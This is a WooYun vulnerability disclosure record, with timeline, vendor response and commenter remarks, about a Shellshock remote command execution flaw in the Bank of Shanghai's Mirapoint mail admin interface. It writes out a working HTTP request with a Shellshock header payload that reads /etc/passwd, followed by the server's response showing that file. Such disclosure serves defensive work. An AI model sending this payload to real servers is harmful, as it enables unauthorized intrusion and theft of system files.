{"id": 49376, "wybug_id": "wooyun-2014-078918", "wybug_title": "上海银行重要内部系统命令执行", "wybug_corp": "bankofshanghai.com", "wybug_author": "拖鞋王子", "wybug_date": "2014-10-11 00:18", "wybug_open_date": "2014-11-25 00:20", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向公众公开  简要描述： 用神器一看今天发现上海银行重要内部系统依旧命令执行 详细说明：  \nGET /cgi-bin/madmin.cgi HTTP/1.1Host: mail.bankofshanghai.comProxy-Connection: keep-aliveCache-Control: max-age=0X-Test: () { :;};a=`/bin/cat /etc/passwd`;echo $aAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36Accept-Encoding: gzip,deflate,sdchAccept-Language: en,zh-CN;q=0.8,zh;q=0.6,ko;q=0.4,zh-TW;q=0.2,th;q=0.2,ja;q=0.2\n   漏洞证明：  \nHTTP/1.1 200 OKDate: Fri, 10 Oct 2014 15:39:23 GMTServer: Mirapoint/4.3.4-GAroot: x:0:0:root:/root:/bin/bashbin: x:1:1:bin:/bin:/sbin/nologindaemon: x:2:2:daemon:/sbin:/sbin/nologinadm: x:3:4:adm:/var/adm:/sbin/nologinlp: x:4:7:lp:/var/spool/lpd:/sbin/nologinsync: x:5:0:sync:/sbin:/bin/syncshutdown: x:6:0:shutdown:/sbin:/sbin/shutdownhalt: x:7:0:halt:/sbin:/sbin/haltmail: x:8:12:mail:/var/spool/mail:/sbin/nologinnews: x:9:13:news:/etc/news:uucp: x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator: x:11:0:operator:/root:/sbin/nologingames: x:12:100:games:/usr/games:/sbin/nologingopher: x:13:30:gopher:/var/gopher:/sbin/nologinftp: x:14:50:FTP User:/var/ftp:/sbin/nologinnobody: x:99:99:Nobody:/:/sbin/nologinvcsa: x:69:69:virtual console memory owner:/dev:/sbin/nologinmonit: x:100:101:monit daemon:/var/lib/monit:/bin/shpcap: x:77:77::/var/arpwatch:/sbin/nologinnscd: x:28:28:NSCD Daemon:/:/sbin/nologinntp: x:38:38::/etc/ntp:/sbin/nologindbus: x:81:81:System message bus:/:/sbin/nologinrpc: x:32:32:Portmapper RPC user:/:/sbin/nologinnamed: x:25:25:Named:/var/named:/sbin/nologinsshd: x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinmemcached: x:101:102:Memcached daemon:/var/run/memcached:/sbin/nologinoprofile: x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinhaldaemon: x:68:68:HAL daemon:/:/sbin/nologinrpcuser: x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody: x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinman: x:500:15::/home/man:/bin/bashmira: x:70:70::/home/mira:/bin/bashnetdump: x:34:34::/home/netdump:/bin/bashcyrus: x:70:70::/home/cyrus:/bin/bashCache-Control: no-cachePragma: no-cacheKeep-Alive: timeout=15, max=100Connection: Keep-AliveContent-Type: text/html; charset=GB2312<html><head><meta http-equiv='Content-Type' content='text/html; charset=GB2312'><META HTTP-EQUIV='Expires' CONTENT='Tue, 04 Dec 1993 21:29:02 GMT'><META HTTP-EQUIV='Pragma' CONTENT='no-cache'><LINK REL=STYLESHEET TYPE='text/css' HREF='/extras/css/admin.css'><LINK REL='SHORTCUT ICON' href='/sa/Mira_bookmark.ico'><title>ÓÊ¼þ·þÎñÆ÷µÇÂ¼</title><script language=javascript src='/sa/sa.js'></script></head><body class='genLogin' onload='document.forms[0].elements[0].focus()' text='#000000' bgcolor='#efefef' leftmargin='0' topmargin='0'><center><table border='0' cellpadding='8' cellspacing='0' background='/sa/globe_full.gif' width=800>  <tr>     <td width='230' align=center valign=bottom>&nbsp;</td>    <td width='400' height='108' align=center valign=bottom>&nbsp;</td>    <td align=center valign=bottom>&nbsp;</td>  </tr>  <tr align='left'>     <td colspan='3' valign=bottom>       <table width='545' border='0' cellspacing='0' cellpadding='0'>        <tr>          <td width='201'>&nbsp;</td>          <td width='338'>\t    <table width='334' height='81' border='0' cellpadding='0' cellspacing='0' background='/sa/loginbanner.gif'>\t      <tr><td>&nbsp;</td></tr>            </table>\t  </td>        </tr>        <tr>            <td colspan=2 nowrap align=right>\t     <font class='genLoginTitle' color='#f5873c'><strong>ÓÊ¼þ·þÎñÆ÷µÇÂ¼</strong></font>\t   </td>         </tr>      </table>    </td>  </tr>  <tr>    <td width='230' align=center>&nbsp;</td>    <td align='left' colspan='2'>      <form ACTION='/cgi-bin/madmin.cgi/sa/login.html' NAME='myform' AutoComplete='off'             METHOD='POST' ENCTYPE='application/x-www-form-urlencoded' onSubmit='checkjavascript(myform.browserjs);'>      <table cellspacing=0 cellpadding=0 width=160 bgcolor=#ffffff border=0>\t<tr>           <td colspan='2' rowspan='2' align='left' valign='top' bgcolor='efefef'><img src='/sa/lefttopgrey.gif' width='12' height='12'></td>          <td height=1 valign=top bgcolor='#cccccc'><img height=1 alt='' src='/sa/ts.gif' width=1 border=0></td>          <td colspan='2' rowspan='2' align='right' valign='top' bgcolor='efefef'><img src='/sa/righttopgrey.gif' width='12' height='12'></td>\t</tr>        <tr>           <td height=11 valign=top bgcolor='#ffffff'></td>        </tr>        <tr>           <td width=1 bgcolor=#cccccc><img height=1 alt='' src='/sa/ts.gif' width=1 border=0></td>          <td width=11 bgcolor=#ffffff>&nbsp;</td>          <td align='center' valign=top>\t    <table cellspacing=0 border=0>              <tr>        \t<td colspan='2' align='right' nowrap>        \t  <font class=text1>±ê×¼Á¬½Ó | <a href='https://mail.bankofshanghai.com/cgi-bin/madmin.cgi/sa?locale=zs_CN.utf-8L4_3'>°²È«Á¬½Ó</a></font>        \t</td>              </tr>              <tr>        \t<td align='right' nowrap>\t\t  ÓÃ»§£º\t\t</td>        \t<td>\t\t  <input type='text' size='20' name='user' value='' tabindex=1 onkeypress='checkWhich(event, login)'>\t\t</td>              </tr>              <tr>        \t<td align='right' nowrap>\t\t  ÃÜÂë£º\t\t</td>        \t<td>\t\t  <input type='password' size='20' name='password' value='' tabindex=2 onkeypress='checkWhich(event, login)'>\t\t</td>              </tr>              <tr>        \t<td>\t\t  &nbsp;\t\t</td>        \t<td align='right'>\t\t  <input type='submit' name='login' value='µÇÂ¼' tabindex=3 class='btn'>\t\t</td>              </tr>            </table>\t  </td>          <td width=11 bgcolor=#ffffff><img height=1 alt=''  src='/sa/ts.gif' width=1 border=0></td>          <td width=1 bgcolor=#cccccc></td>        </tr>        <tr>           <td colspan='2' rowspan='2' align='left' valign='top' bgcolor='efefef'><img src='/sa/leftbotgrey.gif' width='12' height='12'></td>          <td height='11' valign=top bgcolor='#ffffff'><img height=1 alt='' src='/sa/ts.gif' width=1 border=0></td>          <td colspan='2' rowspan='2' align='right' valign='top' bgcolor='efefef'><img src='/sa/rightbotgrey.gif' width='12' height='12'></td>        </tr>        <tr>           <td height='1' valign=top bgcolor='#cccccc'></td>        </tr>      </table>      <input type='hidden' name='timestamp' value='1412955563'>      <input type='hidden' name='locale' value='zs_CN.utf-8L4_3'>      <input type='hidden' name='browserjs' value='false'>      <input type='hidden' name='mutual_lock' value=''>      </form>    </td>  </tr>  <tr>     <td height='65' colspan='3'>      &nbsp;    </td>  </tr>  <tr>    <td>&nbsp;</td>    <td colspan='2' align='left'>      <font class=text1> &nbsp;</font>    </td>  </tr>  <tr>    <td>&nbsp;</td>    <td colspan='2' align='left'>            <a href='/cgi-bin/madmin.cgi/sa/login.html?locale=en_US.ISO_8859-1'>  <nobr>Ó¢Óï</nobr></a> - <a href='/cgi-bin/madmin.cgi/sa/login.html?locale=ja_JP.utf-8'>  <nobr>ÈÕÓï</nobr></a> - <a name='/cgi-bin/madmin.cgi/sa/login.html?locale=zs_CN.utf-8L4_3'>  <nobr>¼òÌåÖÐÎÄ</nobr></a>    </td>  </tr>  <tr>    <td>&nbsp;</td>    <td colspan='2' align='left'>      <font class=text1>Copyright &copy; 1998-2011 <a href='http://www.mirapoint.com' target='_blank'>Mirapoint Software</a>, Inc.</font>    </td>  </tr></table></center></body></html>\n   修复方案：     版权声明：转载请注明来源 拖鞋王子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-10-15 17:40 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-11 09:54 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  http://loudong.360.cn/vul/info/id/25284  两边拿的感觉是不是很爽    \n     2014-10-11 11:25 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xsser 表示详情已得知。    \n     2014-10-11 12:38 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @孤独雪狼 我们无法确定漏洞的唯一发现者是谁，不要在意这些细节    \n     2014-10-11 14:30 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n   WooYun: 某地区商业银行某系统BASH远程命令执行漏洞  这个才是最先提交的，360上面的都重复了。    \n     2014-10-11 16:34 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @猪猪侠 终于知道是哪个邮件系统了    \n     2014-11-25 09:39 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n    更长沙银行是同一个洞？      \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}